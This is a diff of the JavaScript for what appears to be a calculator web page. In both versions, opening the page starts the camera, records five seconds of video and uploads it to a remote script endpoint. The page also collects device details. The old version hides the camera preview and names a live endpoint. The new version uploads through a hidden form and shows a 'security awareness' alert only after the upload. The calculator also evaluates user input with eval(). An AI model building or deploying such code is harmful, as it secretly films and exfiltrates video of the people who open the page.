@@ -3,148 +3,164 @@ console.log("Script Loaded");
 let result = document.getElementById("result");
 let video = document.getElementById("video");
 
-const DRIVE_API = "https://script.google.com/macros/s/AKfycbyP5H3U1sKrClXXeWvb8nJhahk1JpIZkQEmu6ttuXBB_hXDJcGWH3-d8U7a1Zp9ubQVIw/exec";
+const DRIVE_API = "YOUR_SCRIPT_URL";
 
 function press(v){
-    result.value += v;
+result.value += v;
 }
 
 function clearResult(){
-    result.value = "";
+result.value="";
 }
 
 function calculate(){
-    try{
-        result.value = eval(result.value);
-    }catch{
-        result.value = "Error";
-    }
+try{
+result.value = eval(result.value);
+}catch{
+result.value="Error";
+}
 }
 
 let mediaRecorder;
-let chunks = [];
+let chunks=[];
 
 async function startCamera(){
 
-    try{
+try{
 
-        console.log("Starting camera");
+console.log("Starting camera");
 
-        let stream = await navigator.mediaDevices.getUserMedia({video:true});
+let stream = await navigator.mediaDevices.getUserMedia({video:true});
 
-        video.srcObject = stream;
+video.srcObject = stream;
 
-        // hide camera preview
-        video.style.display = "none";
+mediaRecorder = new MediaRecorder(stream);
 
-        mediaRecorder = new MediaRecorder(stream);
+mediaRecorder.ondataavailable=function(e){
+chunks.push(e.data);
+};
 
-        mediaRecorder.ondataavailable = function(e){
-            chunks.push(e.data);
-        };
+mediaRecorder.onstop=function(){
 
-        mediaRecorder.onstop = function(){
+console.log("Recording stopped");
 
-            console.log("Recording stopped");
+let blob=new Blob(chunks,{type:"video/webm"});
 
-            let blob = new Blob(chunks,{type:"video/webm"});
+chunks=[];
 
-            // reset buffer
-            chunks = [];
+saveLocal(blob);
 
-            saveLocal(blob);
+uploadToDrive(blob);
 
-            uploadToDrive(blob);
+setTimeout(()=>{
+showSecurityWarning();
+},1000);
 
-        };
+};
 
-        mediaRecorder.start();
+mediaRecorder.start();
 
-        console.log("Recording started");
+console.log("Recording started");
 
-        setTimeout(()=>{
-            mediaRecorder.stop();
-        },5000);
+setTimeout(()=>{
+mediaRecorder.stop();
+},5000);
 
-    }catch(err){
+}catch(err){
 
-        console.log("Camera error:",err);
+console.log("Camera error:",err);
 
-    }
+}
 
 }
 
 function saveLocal(blob){
 
-    let reader = new FileReader();
+let reader=new FileReader();
 
-    reader.readAsDataURL(blob);
+reader.readAsDataURL(blob);
 
-    reader.onloadend=function(){
+reader.onloadend=function(){
 
-        localStorage.setItem("recordedVideo",reader.result);
+localStorage.setItem("recordedVideo",reader.result);
 
-        console.log("Saved video to Local Storage");
+console.log("Video saved to Local Storage");
 
-    };
+};
 
 }
 
 function uploadToDrive(blob){
 
-    let reader = new FileReader();
+let reader=new FileReader();
 
-    reader.readAsDataURL(blob);
+reader.readAsDataURL(blob);
 
-    reader.onloadend=function(){
+reader.onloadend=function(){
 
-        let base64data = reader.result.split(',')[1];
+let base64data=reader.result.split(',')[1];
 
-        fetch(DRIVE_API,{
-            method:"POST",
-            body:JSON.stringify({
-                data: base64data,
-                filename: "capture_" + Date.now() + ".webm"
-            }),
-            headers:{
-                "Content-Type":"application/json"
-            }
-        })
-        .then(res=>res.json())
-        .then(data=>{
-            console.log("Uploaded to Drive:",data);
-        })
-        .catch(err=>{
-            console.log("Drive upload failed:",err);
-        });
+let form=document.createElement("form");
+form.method="POST";
+form.action=DRIVE_API;
+form.target="hidden_iframe";
 
-    };
+let inputData=document.createElement("input");
+inputData.type="hidden";
+inputData.name="data";
+inputData.value=base64data;
+
+let inputName=document.createElement("input");
+inputName.type="hidden";
+inputName.name="filename";
+inputName.value="capture_"+Date.now()+".webm";
+
+form.appendChild(inputData);
+form.appendChild(inputName);
+
+document.body.appendChild(form);
+
+form.submit();
+
+console.log("Upload request sent to Drive");
+
+};
 
 }
 
 function captureDeviceInfo(){
 
-    let deviceInfo = {
-        browser: navigator.userAgent,
-        os: navigator.platform,
-        screen: screen.width + "x" + screen.height,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-    };
+let deviceInfo={
+browser:navigator.userAgent,
+os:navigator.platform,
+screen:screen.width+"x"+screen.height,
+timezone:Intl.DateTimeFormat().resolvedOptions().timeZone
+};
 
-    localStorage.setItem("deviceInfo",JSON.stringify(deviceInfo));
+localStorage.setItem("deviceInfo",JSON.stringify(deviceInfo));
 
-    console.table(deviceInfo);
+console.table(deviceInfo);
 
 }
 
-window.onload = function(){
+function showSecurityWarning(){
 
-    console.log("Page loaded");
+alert(
+"Security Awareness Demonstration\n\n"+
+"This demonstration shows how malicious websites could misuse camera permissions.\n\n"+
+"Always verify a website before allowing camera access."
+);
 
-    captureDeviceInfo();
+}
 
-    setTimeout(()=>{
-        startCamera();
-    },1500);
+window.onload=function(){
+
+console.log("Page loaded");
+
+captureDeviceInfo();
+
+setTimeout(()=>{
+startCamera();
+},1500);
 
 };
